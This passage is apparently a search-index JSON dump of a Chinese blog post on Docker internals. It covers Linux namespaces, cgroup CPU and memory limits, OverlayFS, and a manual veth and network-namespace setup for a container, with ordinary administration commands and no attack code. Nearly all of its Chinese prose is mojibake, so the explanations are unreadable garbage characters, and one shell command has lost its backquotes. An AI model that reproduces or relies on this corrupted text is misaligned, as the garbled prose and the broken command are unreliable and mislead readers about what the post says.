","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:1:4","tags":["äº‘åŸç”Ÿå®‰å…¨","Docker"],"title":"Docker æ ¸å¿ƒæŠ€æœ¯","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"2 Namespcce ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:2:0","tags":["äº‘åŸç”Ÿå®‰å…¨","Docker"],"title":"Docker æ ¸å¿ƒæŠ€æœ¯","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"2.1 èƒŒæ™¯ Linux Namespace æ˜¯ä¸€ç§ Linux Kernel æä¾›çš„èµ„æºéš”ç¦»æ–¹æ¡ˆã€‚ ç³»ç»Ÿå¯ä»¥ä¸ºè¿›ç¨‹åˆ†é…ä¸åŒçš„ Namespace å¹¶ä¿è¯ä¸åŒçš„ Namespace èµ„æºç‹¬ç«‹åˆ†é…ã€è¿›ç¨‹å½¼æ­¤éš”ç¦»ï¼Œå³ä¸åŒçš„ Namespace ä¸‹çš„è¿›ç¨‹äº’ä¸å¹²æ‰° Linux å†…æ ¸ä»£ç ä¸­ Namespace çš„å®ç°å¦‚ä¸‹ï¼š ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:2:1","tags":["äº‘åŸç”Ÿå®‰å…¨","Docker"],"title":"Docker æ ¸å¿ƒæŠ€æœ¯","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"2.2 ç±»åˆ« 2.2.1 è¿›ç¨‹ç¼–å· - PID å½“å¯åŠ¨äº†å¤šä¸ªcontainerï¼Œç„¶ååœ¨æ¯ä¸ª container å†…éƒ¨ç”¨ ps å‘½ä»¤çœ‹ä¸€ä¸‹ï¼Œä¼šå‘ç°å®ƒä»¬éƒ½æœ‰ä¸€ä¸ª PID ä¸º 1 çš„è¿›ç¨‹ã€‚ä¸åŒç”¨æˆ·çš„è¿›ç¨‹å°±æ˜¯é€šè¿‡ PID namespace éš”ç¦»å¼€çš„ï¼Œä¸”ä¸åŒçš„ namespace ä¸­å¯ä»¥æœ‰ç›¸åŒçš„ PIDã€‚æœ‰äº† PID namespaceï¼Œæ¯ä¸ª namespace ä¸­çš„ PID èƒ½å¤Ÿç›¸äº’éš”ç¦»ã€‚ 2.2.2 ç½‘ç»œè®¾å¤‡ - Network åœ¨æ¯ä¸ª network space å†…éƒ¨ï¼Œå¯ä»¥æœ‰ç‹¬ç«‹çš„ç½‘ç»œè®¾å¤‡ï¼ˆè™šæ‹Ÿçš„æˆ–è€…çœŸå®çš„ï¼‰ã€IP åœ°å€ã€è·¯ç”±è¡¨å’Œé˜²ç«å¢™è§„åˆ™ç­‰ã€‚å…¶ä¸­çš„åº”ç”¨æ‰€ bind çš„ç«¯å£ä¹Ÿæ˜¯ per-namespace çš„ï¼Œæ¯”å¦‚ http é»˜è®¤ä½¿ç”¨çš„æ˜¯ 80 ç«¯å£ï¼Œä½¿ç”¨ network space åï¼ŒåŒä¸€ host ä¸Šçš„å„ä¸ª container å†…éƒ¨å°±éƒ½å¯ä»¥è¿è¡Œå„è‡ªçš„ web serverã€‚ Docker é»˜è®¤é‡‡ç”¨ veth çš„æ–¹å¼å°† container ä¸­çš„è™šæ‹Ÿç½‘å¡åŒ host ä¸Šçš„ä¸€ä¸ª docker bridge: docker0 è¿æ¥åœ¨ä¸€èµ·ã€‚ 2.2.3 è¿›ç¨‹é—´é€šä¿¡ - IPC åˆ©ç”¨è¿™ä¸ª spaceï¼Œè¿›ç¨‹é—´çš„é€šä¿¡ï¼ˆInter Process Communicationï¼‰å°±è¢«é™å®šåœ¨äº†åŒä¸€ä¸ª space å†…éƒ¨ï¼Œå³ä¸€ä¸ª container ä¸­çš„æŸä¸ªè¿›ç¨‹åªèƒ½å’ŒåŒä¸€ container ä¸­çš„å…¶ä»–è¿›ç¨‹é€šä¿¡ã€‚ container çš„è¿›ç¨‹é—´äº¤äº’å®é™…ä¸Šè¿˜æ˜¯ host ä¸Šå…·æœ‰ç›¸åŒ Pid namespace ä¸­çš„è¿›ç¨‹é—´äº¤äº’ï¼Œå› æ­¤éœ€è¦åœ¨ IPC èµ„æºç”³è¯·æ—¶åŠ å…¥ namespace ä¿¡æ¯ - æ¯ä¸ª IPC èµ„æºæœ‰ä¸€ä¸ªå”¯ä¸€çš„ 32 ä½ IDã€‚ 2.2.4 æ–‡ä»¶ç³»ç»Ÿ - Mount mnt namespace å…è®¸ä¸åŒ namespace çš„è¿›ç¨‹çœ‹åˆ°çš„æ–‡ä»¶ç»“æ„ä¸åŒï¼Œè¿™æ ·æ¯ä¸ª namespace ä¸­çš„è¿›ç¨‹æ‰€çœ‹åˆ°çš„æ–‡ä»¶ç›®å½•å°±è¢«éš”ç¦»å¼€äº†ã€‚ 2.2.5 ä¸»æœºåŸŸå - UTS ç”±äºå¤šä¸ª container æ˜¯å…±äº« OS å†…æ ¸çš„ï¼Œå› è€Œåƒ UTS é‡Œçš„ os type å’Œ os release ç­‰ä¿¡æ¯æ˜¯ä¸å¯èƒ½æ›´æ”¹çš„ï¼Œä½†æ˜¯æ¯ä¸ª container å¯ä»¥æœ‰è‡ªå·±ç‹¬ç«‹çš„ host name å’Œ domain nameï¼Œä»¥ä¾¿äºæ ‡è¯†å’ŒåŒºåˆ†ï¼ˆæ¯”å¦‚å¯ä»¥é€šè¿‡ä¸»æœºåæ¥è®¿é—®ç½‘ç»œä¸­çš„æœºå™¨ï¼‰ï¼Œè¿™å°±æ˜¯ UTS namespace çš„ä½œç”¨ã€‚ 2.2.6 ç”¨æˆ·æ§åˆ¶ - USR æ¯ä¸ª container å¯ä»¥æœ‰ä¸åŒçš„ user å’Œ group id, ä¹Ÿå°±æ˜¯è¯´å¯ä»¥åœ¨ container å†…éƒ¨ç”¨ container å†…éƒ¨çš„ç”¨æˆ·æ‰§è¡Œç¨‹åºè€Œé Host ä¸Šçš„ç”¨æˆ·ã€‚ ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:2:2","tags":["äº‘åŸç”Ÿå®‰å…¨","Docker"],"title":"Docker æ ¸å¿ƒæŠ€æœ¯","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"2.3 linux å¯¹ namespace çš„æ“ä½œæ–¹æ³• clone åœ¨åˆ›å»ºæ–°è¿›ç¨‹çš„ç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œå¯ä»¥é€šè¿‡ flags å‚æ•°æŒ‡å®šéœ€è¦æ–°å»ºçš„ Namespace ç±»å‹ã€‚ clone å‡½æ•°åŸå‹ï¼š int clone(int (*fn)(void *), void *child_stack, int flags, void *arg) sets è¯¥ç³»ç»Ÿè°ƒç”¨å¯ä»¥è®©è°ƒç”¨è¿›ç¨‹åŠ å…¥æŸä¸ªå·²ç»å­˜åœ¨çš„ Namespace ä¸­ï¼š int setns(int fd, int nstype) unshare è¯¥ç³»ç»Ÿè°ƒç”¨å¯ä»¥å°†è°ƒç”¨è¿›ç¨‹ç§»åŠ¨åˆ°æ–°çš„ Namespace ä¸‹: int unshare(int flags) ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:2:3","tags":["äº‘åŸç”Ÿå®‰å…¨","Docker"],"title":"Docker æ ¸å¿ƒæŠ€æœ¯","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"2.4 å…³äº namespace çš„å¸¸ç”¨æ“ä½œ æŸ¥çœ‹å½“å‰ç³»ç»Ÿçš„ namespaceï¼š lsns -t [type] æŸ¥çœ‹è¿›ç¨‹çš„ namespaceï¼š ls -la /proc/[pid]/ns/ è¿›å…¥æŸ namespace è¿è¡Œå‘½ä»¤ï¼š nsenter -t [pid] -n ip addr ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:2:4","tags":["äº‘åŸç”Ÿå®‰å…¨","Docker"],"title":"Docker æ ¸å¿ƒæŠ€æœ¯","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"3 Cgroup ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:3:0","tags":["äº‘åŸç”Ÿå®‰å…¨","Docker"],"title":"Docker æ ¸å¿ƒæŠ€æœ¯","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"3.1 èƒŒæ™¯ Cgroups (Control Groups)æ˜¯ Linux ä¸‹ç”¨äºå¯¹ä¸€ä¸ªæˆ–ä¸€ç»„è¿›ç¨‹è¿›è¡Œèµ„æºæ§åˆ¶å’Œç›‘æ§çš„æœºåˆ¶ å¯ä»¥å¯¹è¯¸å¦‚ CPU ä½¿ç”¨æ—¶é—´ã€å†…å­˜ã€ç£ç›˜ I/O ç­‰è¿›ç¨‹æ‰€éœ€çš„èµ„æºè¿›è¡Œé™åˆ¶; ä¸åŒèµ„æºçš„å…·ä½“ç®¡ç†å·¥ä½œç”±ç›¸åº”çš„ Cgroup å­ç³»ç»Ÿ(Subsystem)æ¥å®ç° ; é’ˆå¯¹ä¸åŒç±»å‹çš„èµ„æºé™åˆ¶ï¼Œåªè¦å°†é™åˆ¶ç­–ç•¥åœ¨ä¸åŒçš„çš„å­ç³»ç»Ÿä¸Šè¿›è¡Œå…³è”å³å¯ ; Cgroups åœ¨ä¸åŒçš„ç³»ç»Ÿèµ„æºç®¡ç†å­ç³»ç»Ÿä¸­ä»¥å±‚çº§æ ‘(Hierarchy)çš„æ–¹å¼æ¥ç»„ç»‡ç®¡ç†ï¼šæ¯ä¸ª Cgroup éƒ½å¯ä»¥åŒ…å«å…¶ä»–çš„å­ Cgroupï¼Œå› æ­¤å­ Cgroup èƒ½ä½¿ç”¨çš„èµ„æºé™¤äº†å—æœ¬ Cgroup é…ç½®çš„èµ„æºå‚æ•°é™åˆ¶ï¼Œè¿˜å—åˆ°çˆ¶ Cgroup è®¾ç½®çš„èµ„æºé™åˆ¶ ã€‚ Linux å†…æ ¸ä»£ç ä¸­ Cgroups çš„å®ç°ï¼š ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:3:1","tags":["äº‘åŸç”Ÿå®‰å…¨","Docker"],"title":"Docker æ ¸å¿ƒæŠ€æœ¯","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"3.2 ç±»åˆ« cgroups å®ç°äº†å¯¹èµ„æºçš„é…é¢å’Œåº¦é‡ blkioï¼šè¿™ä¸ªå­ç³»ç»Ÿè®¾ç½®é™åˆ¶æ¯ä¸ªå—è®¾å¤‡çš„è¾“å…¥è¾“å‡ºæ§åˆ¶ã€‚ä¾‹å¦‚ï¼šç£ç›˜ï¼Œå…‰ç›˜ä»¥åŠ USB ç­‰ç­‰ cpuï¼šè¿™ä¸ªå­ç³»ç»Ÿä½¿ç”¨è°ƒåº¦ç¨‹åºä¸º cgroup ä»»åŠ¡æä¾› CPU çš„è®¿é—® cpuacctï¼šäº§ç”Ÿ cgroup ä»»åŠ¡çš„ CPU èµ„æºæŠ¥å‘Š cpusetï¼šå¦‚æœæ˜¯å¤šæ ¸å¿ƒçš„ CPUï¼Œè¿™ä¸ªå­ç³»ç»Ÿä¼šä¸º cgroup ä»»åŠ¡åˆ†é…å•ç‹¬çš„ CPU å’Œå†…å­˜ devicesï¼šå…è®¸æˆ–æ‹’ç» cgroup ä»»åŠ¡å¯¹è®¾å¤‡çš„è®¿é—® freezerï¼šæš‚åœå’Œæ¢å¤ cgroup ä»»åŠ¡ memoryï¼šè®¾ç½®æ¯ä¸ª cgroup çš„å†…å­˜é™åˆ¶ä»¥åŠäº§ç”Ÿå†…å­˜èµ„æºæŠ¥å‘Š net_clsï¼šæ ‡è®°æ¯ä¸ªç½‘ç»œåŒ…ä»¥ä¾› cgroup æ–¹ä¾¿ä½¿ç”¨ nsï¼šåç§°ç©ºé—´å­ç³»ç»Ÿ pidï¼šè¿›ç¨‹æ ‡è¯†å­ç³»ç»Ÿ 3.2.1 cpu å­ç³»ç»Ÿ cpu.sharesï¼šå¯å‡ºè®©çš„èƒ½è·å¾— CPU ä½¿ç”¨æ—¶é—´çš„ç›¸å¯¹å€¼ã€‚ cpu.cfs_period_usï¼šç”¨æ¥é…ç½®æ—¶é—´å‘¨æœŸé•¿åº¦ï¼Œå•ä½ä¸º us(å¾®ç§’)ã€‚ cpu.cfs_quota_usï¼šç”¨æ¥é…ç½®å½“å‰ Cgroup åœ¨ cfs_period_us æ—¶é—´å†…æœ€å¤šèƒ½ä½¿ç”¨çš„ CPU æ—¶é—´æ•°ï¼Œå•ä½ä¸º us(å¾®ç§’)ã€‚ cpu.statï¼šCgroup å†…çš„è¿›ç¨‹ä½¿ç”¨çš„ CPU æ—¶é—´ç»Ÿè®¡ã€‚ nr_periodsï¼šç»è¿‡ cpu.cfs_period_us çš„æ—¶é—´å‘¨æœŸæ•°é‡ã€‚ nr_throttledï¼šåœ¨ç»è¿‡çš„å‘¨æœŸå†…ï¼Œæœ‰å¤šå°‘æ¬¡å› ä¸ºè¿›ç¨‹åœ¨æŒ‡å®šçš„æ—¶é—´å‘¨æœŸå†…ç”¨å…‰äº†é…é¢æ—¶é—´è€Œå—åˆ°é™åˆ¶ã€‚ throttled_timeï¼šCgroup ä¸­çš„è¿›ç¨‹è¢«é™åˆ¶ä½¿ç”¨ CPU çš„æ€»ç”¨æ—¶ï¼Œå•ä½æ˜¯ ns(çº³ç§’)ã€‚ ç¤ºä¾‹ åˆ©ç”¨ cgroup cpu å­ç³»ç»Ÿæ§åˆ¶èµ„æºè®¿é—® åœ¨ cgroup cpu å­ç³»ç»Ÿç›®å½•ä¸­åˆ›å»ºç›®å½•ç»“æ„ï¼š cd /sys/fs/cgroup/cpu mkdir cpudemo cd cpudemo è¿è¡Œå¦‚ä¸‹ä»£ç ï¼š package main func main() { go func(){ for { } }() for { } } æ‰§è¡Œ top æŸ¥çœ‹ CPU ä½¿ç”¨æƒ…å†µï¼ŒCPU å ç”¨ 200%ï¼š å†é€šè¿‡ cgroup é™åˆ¶ cpuï¼š cd /sys/fs/cgroup/cpu/cpudemo # æŠŠè¿›ç¨‹æ·»åŠ åˆ° cgroup è¿›ç¨‹é…ç½®ç»„ echo ps -ef|grep poc|grep -v grep|awk '{print $2}' \u003e cgroup.procs # è®¾ç½® cpuquota echo 10000 \u003e cpu.cfs_quota_us æ‰§è¡Œ top æŸ¥çœ‹ CPU ä½¿ç”¨æƒ…å†µï¼ŒCPU å ç”¨å˜ä¸º10%ï¼š åˆ é™¤åˆ†ç»„ï¼š cgdelete -g cpu:cpudemo 3.2.2 Memory å­ç³»ç»Ÿ memory.usage_in_bytesï¼š cgroup ä¸‹è¿›ç¨‹ä½¿ç”¨çš„å†…å­˜ï¼ŒåŒ…å« cgroup åŠå…¶å­ cgroup ä¸‹çš„è¿›ç¨‹ä½¿ç”¨çš„å†…å­˜ memory.max_usage_in_bytesï¼š cgroup ä¸‹è¿›ç¨‹ä½¿ç”¨å†…å­˜çš„æœ€å¤§å€¼ï¼ŒåŒ…å«å­ cgroup çš„å†…å­˜ä½¿ç”¨é‡ã€‚ memory.limit_in_bytes è®¾ç½® Cgroup ä¸‹è¿›ç¨‹æœ€å¤šèƒ½ä½¿ç”¨çš„å†…å­˜ã€‚å¦‚æœè®¾ç½®ä¸º -1ï¼Œè¡¨ç¤ºå¯¹è¯¥ cgroup çš„å†…å­˜ä½¿ç”¨ä¸åšé™åˆ¶ã€‚ memory.oom_control è®¾ç½®æ˜¯å¦åœ¨ Cgroup ä¸­ä½¿ç”¨ OOM(Out of Memory)Killerï¼Œé»˜è®¤ä¸ºä½¿ç”¨ã€‚å½“å±äºè¯¥ cgroup çš„è¿›ç¨‹ä½¿ç”¨çš„å†…å­˜è¶…è¿‡æœ€å¤§çš„é™å®šå€¼æ—¶ï¼Œä¼šç«‹åˆ»è¢« OOM Killer å¤„ç†ã€‚ ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:3:2","tags":["äº‘åŸç”Ÿå®‰å…¨","Docker"],"title":"Docker æ ¸å¿ƒæŠ€æœ¯","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"4 æ–‡ä»¶ç³»ç»Ÿ ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:4:0","tags":["äº‘åŸç”Ÿå®‰å…¨","Docker"],"title":"Docker æ ¸å¿ƒæŠ€æœ¯","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"4.1 èƒŒæ™¯ docker çš„åˆ›æ–°ç‚¹ï¼šUnion FS è¿ç”¨åˆ°æ–‡ä»¶ç³»ç»Ÿä¸­ å°†ä¸åŒç›®å½•æŒ‚è½½åˆ°åŒä¸€ä¸ªè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿä¸‹ (unite several directories into a single virtual filesystem) çš„æ–‡ä»¶ç³»ç»Ÿ æ”¯æŒä¸ºæ¯ä¸€ä¸ªæˆå‘˜ç›®å½•(ç±»ä¼¼Git Branch)è®¾å®š readonlyã€readwrite å’Œ whiteoutable æƒé™ æ–‡ä»¶ç³»ç»Ÿåˆ†å±‚, å¯¹ readonly æƒé™çš„ branch å¯ä»¥é€»è¾‘ä¸Šè¿›è¡Œä¿®æ”¹(å¢é‡åœ°, ä¸å½±å“ readonly éƒ¨åˆ†çš„) é€šå¸¸ Union FS æœ‰ä¸¤ä¸ªç”¨é€”, ä¸€æ–¹é¢å¯ä»¥å°†å¤šä¸ª disk æŒ‚åˆ°åŒä¸€ä¸ªç›®å½•ä¸‹ï¼Œå¦ä¸€ä¸ªæ›´å¸¸ç”¨çš„å°±æ˜¯å°†ä¸€ä¸ª readonly çš„ branch å’Œä¸€ä¸ª writeable çš„ branch è”åˆåœ¨ä¸€èµ·ã€‚ ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:4:1","tags":["äº‘åŸç”Ÿå®‰å…¨","Docker"],"title":"Docker æ ¸å¿ƒæŠ€æœ¯","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"4.2 Docker çš„æ–‡ä»¶ç³»ç»Ÿ å…¸å‹çš„ Linux æ–‡ä»¶ç³»ç»Ÿç»„æˆï¼š Bootfs(boot file system) Bootloader - å¼•å¯¼åŠ è½½ kernelï¼Œ Kernel - å½“ kernel è¢«åŠ è½½åˆ°å†…å­˜ä¸­å umount bootfsã€‚ rootfs (root file system) /devï¼Œ/procï¼Œ/binï¼Œ/etc ç­‰æ ‡å‡†ç›®å½•å’Œæ–‡ä»¶ã€‚ å¯¹äºä¸åŒçš„ linux å‘è¡Œç‰ˆï¼Œbootfs åŸºæœ¬æ˜¯ä¸€è‡´çš„ï¼Œ ä½† rootfs ä¼šæœ‰å·®åˆ«ã€‚ 4.2.1 å¯åŠ¨è¿‡ç¨‹çš„å·®å¼‚ Linux çš„å¯åŠ¨ï¼š åœ¨å¯åŠ¨åï¼Œé¦–å…ˆå°† rootfs è®¾ç½®ä¸º readonlyï¼Œè¿›è¡Œä¸€ç³»åˆ—æ£€æŸ¥ï¼Œç„¶åå°†å…¶åˆ‡æ¢ä¸ºreadwriteä¾›ç”¨æˆ·ä½¿ç”¨ã€‚ Docker çš„å¯åŠ¨ï¼š åˆå§‹åŒ–æ—¶ä¹Ÿæ˜¯å°† rootfs ä»¥ readonly æ–¹å¼åŠ è½½å¹¶æ£€æŸ¥ï¼Œç„¶è€Œæ¥ä¸‹æ¥åˆ©ç”¨ union mount çš„æ–¹å¼å°†ä¸€ä¸ª readwrite æ–‡ä»¶ç³»ç»ŸæŒ‚è½½åœ¨ readonly çš„ rootfs ä¹‹ä¸Šã€‚å¹¶ä¸”å…è®¸å†æ¬¡å°†ä¸‹å±‚çš„ FS è®¾å®šä¸º readonly å¹¶å‘ä¸Šå åŠ ã€‚è¿™æ ·ä¸€ç»„ readonly å’Œä¸€ä¸ª writeable çš„ç»“æ„æ„æˆäº†ä¸€ä¸ª container çš„è¿è¡Œæ—¶æ€ï¼Œæ¯ä¸€ä¸ª FS è¢«ç§°ä½œä¸ºä¸€ä¸ª FS å±‚ã€‚ 4.2.3 å…³äºå†™æ“ä½œ ç”±äºé•œåƒå…·æœ‰å…±äº«ç‰¹æ€§ï¼Œæ‰€ä»¥å¯¹å®¹å™¨å¯å†™å±‚çš„æ“ä½œéœ€è¦ä¾èµ–å­˜å‚¨é©±åŠ¨æä¾›çš„å†™æ—¶å¤åˆ¶å’Œç”¨æ—¶åˆ†é…æœºåˆ¶ï¼Œä»¥æ­¤æ¥æ”¯æŒå¯¹å®¹å™¨å¯å†™å±‚çš„ä¿®æ”¹ï¼Œè¿›è€Œæé«˜å¯¹å­˜å‚¨å’Œå†…å­˜èµ„æºçš„åˆ©ç”¨ç‡ã€‚ å†™æ—¶å¤åˆ¶ å†™æ—¶å¤åˆ¶ï¼Œå³ Copy-on-Writeã€‚ä¸€ä¸ªé•œåƒå¯ä»¥è¢«å¤šä¸ªå®¹å™¨ä½¿ç”¨ï¼Œä½†æ˜¯ä¸éœ€è¦åœ¨å†…å­˜å’Œç£ç›˜ä¸Šåšå¤šä¸ªæ‹·è´ã€‚åœ¨éœ€è¦å¯¹é•œåƒæä¾›çš„æ–‡ä»¶è¿›è¡Œä¿®æ”¹æ—¶ï¼Œè¯¥æ–‡ä»¶ä¼šä»é•œåƒçš„æ–‡ä»¶ç³»ç»Ÿè¢«å¤åˆ¶åˆ°å®¹å™¨çš„å¯å†™å±‚çš„æ–‡ä»¶ç³»ç»Ÿè¿›è¡Œä¿®æ”¹ï¼Œ è€Œé•œåƒé‡Œé¢çš„æ–‡ä»¶ä¸ä¼šæ”¹å˜ã€‚ä¸åŒå®¹å™¨å¯¹æ–‡ä»¶çš„ä¿®æ”¹éƒ½ç›¸äº’ç‹¬ç«‹ã€äº’ä¸å½±å“ã€‚ ç”¨æ—¶åˆ†é… æŒ‰éœ€åˆ†é…ç©ºé—´ï¼Œè€Œéæå‰åˆ†é…ï¼Œå³å½“ä¸€ä¸ªæ–‡ä»¶è¢«åˆ›å»ºå‡ºæ¥åï¼Œæ‰ä¼šåˆ†é…ç©ºé—´ã€‚ 4.2.4 å®¹å™¨å­˜å‚¨é©±åŠ¨ 2.4.5 OverlayFS OverlayFS ä¹Ÿæ˜¯ä¸€ç§ä¸ AUFS ç±»ä¼¼çš„è”åˆæ–‡ä»¶ç³»ç»Ÿï¼ŒåŒæ ·å±äºæ–‡ä»¶çº§çš„å­˜å‚¨é©±åŠ¨ï¼ŒåŒ…å«äº†æœ€åˆçš„ Overlay å’Œæ›´æ–°æ›´ç¨³å®šçš„ overlay2ã€‚ Overlay åªæœ‰ä¸¤å±‚ï¼šupper å±‚å’Œ lower å±‚ï¼ŒLower å±‚ä»£è¡¨é•œåƒå±‚ï¼Œupper å±‚ä»£è¡¨å®¹å™¨å¯å†™å±‚ã€‚ ç¤ºä¾‹ mkdir upper lower merged work echo \"from lower\" \u003e lower/in_lower.txt echo \"from upper\" \u003e upper/in_upper.txt echo \"from lower\" \u003e lower/in_both.txt echo \"from upper\" \u003e upper/in_both.txt sudo mount -t overlay overlay -o lowerdir=`pwd`/lower,upperdir=`pwd`/upper,workdir=`pwd`/work `pwd`/merged cat merged/in_both.txt rm merged/in_both.txt rm merged/in_lower.txt rm merged/in_upper.txt ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:4:2","tags":["äº‘åŸç”Ÿå®‰å…¨","Docker"],"title":"Docker æ ¸å¿ƒæŠ€æœ¯","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"5 ç½‘ç»œ åœ¨ Docker ä¸­æä¾›äº†å¤šç§ç½‘ç»œæ¨¡å¼ï¼š Null(â€“net=None) æŠŠå®¹å™¨æ”¾å…¥ç‹¬ç«‹çš„ç½‘ç»œç©ºé—´ä½†ä¸åšä»»ä½•ç½‘ç»œé…ç½®; ç”¨æˆ·éœ€è¦é€šè¿‡è¿è¡Œ docker network å‘½ä»¤æ¥å®Œæˆç½‘ç»œé…ç½®ã€‚ Host ä½¿ç”¨ä¸»æœºç½‘ç»œåç©ºé—´ï¼Œå¤ç”¨ä¸»æœºç½‘ç»œã€‚ Container é‡ç”¨å…¶ä»–å®¹å™¨çš„ç½‘ç»œã€‚ Bridge(â€“net=bridge) ä½¿ç”¨ Linux ç½‘æ¡¥å’Œ iptables æä¾›å®¹å™¨äº’è”ï¼ŒDocker åœ¨æ¯å°ä¸»æœºä¸Šåˆ›å»ºä¸€ä¸ªåå« docker0 çš„ç½‘æ¡¥ï¼Œé€šè¿‡ veth pair æ¥è¿æ¥è¯¥ä¸»æœºçš„æ¯ä¸€ä¸ª EndPointã€‚ ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:5:0","tags":["äº‘åŸç”Ÿå®‰å…¨","Docker"],"title":"Docker æ ¸å¿ƒæŠ€æœ¯","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"5.1 é»˜è®¤æ¨¡å¼ - ç½‘æ¡¥å’Œ NAT åˆ›å»º nginx é•œåƒï¼Œæ˜ å°„ç«¯å£ 8888:8888 docker run -p 8888:8888 -d nginx æ˜¾ç¤ºç½‘æ¡¥ brctl show nsenter æŸ¥çœ‹å¯¹åº”å®¹å™¨ç½‘ç»œå‘½åç©ºé—´ ä¸»æœºä¸Šçš„ iptables é…ç½® iptables-save -t nat ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:5:1","tags":["äº‘åŸç”Ÿå®‰å…¨","Docker"],"title":"Docker æ ¸å¿ƒæŠ€æœ¯","uri":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"5.2 Null æ¨¡å¼ Null æ¨¡å¼æ˜¯ä¸€ä¸ªç©ºå®ç°ï¼Œå¯ä»¥é€šè¿‡ Null æ¨¡å¼å¯åŠ¨å®¹å™¨å¹¶åœ¨å®¿ä¸»æœºä¸Šé€šè¿‡å‘½ä»¤ä¸ºå®¹å™¨é…ç½®ç½‘ç»œã€‚ ç¤ºä¾‹ åˆ›å»º Null æ¨¡å¼å®¹å™¨ï¼Œæ‰‹åŠ¨é…ç½®å®¹å™¨ç½‘ç»œ ### create network ns ``` mkdir -p /var/run/netns find -L /var/run/netns -type l -delete ``` ### start nginx docker with non network mode ``` docker run --network=none -d nginx ``` ### check corresponding pid ``` docker ps|grep nginx docker inspect \u003ccontainerid\u003e|grep -i pid \"Pid\": 876884, \"PidMode\": \"\", \"PidsLimit\": null, ``` ### check network config for the container ``` nsenter -t 876884 -n ip a ``` ### link network namespace ``` export pid=876884 ln -s /proc/$pid/ns/net /var/run/netns/$pid ip netns list ``` ### check docker bridge on the host ``` brctl show ip a 4: docker0: \u003cBROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc noqueue state UP group default link/ether 02:42:35:40:d3:8b brd ff:ff:ff:ff:ff:ff inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0 valid_lft forever preferred_lft forever inet6 fe80::42:35ff:fe40:d38b/64 scope link valid_lft forever preferred_lft forever ``` ### create veth pair ``` ip link add A type veth peer name B ``` ### config A ``` brctl addif docker0 A ip link set A up ``` ### config B ``` SETIP=172.17.0.10 SETMASK=16 GATEWAY=172.17.0.1 ip link set B netns $pid ip netns exec $pid ip link set dev B name eth0 ip netns exec $pid ip link set eth0 up ip netns exec $pid ip addr add $SETIP/$SETMASK dev eth0 ip netns exec $pid ip route add default via $GATEWAY ``` ### check connectivity ``` curl 172.17.0.10 ``` ","date":"2021-10-21","objectID":"/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/:5:2","tags":["äº‘åŸç”Ÿå®‰å…¨","Docker"],"title":"Docker æ 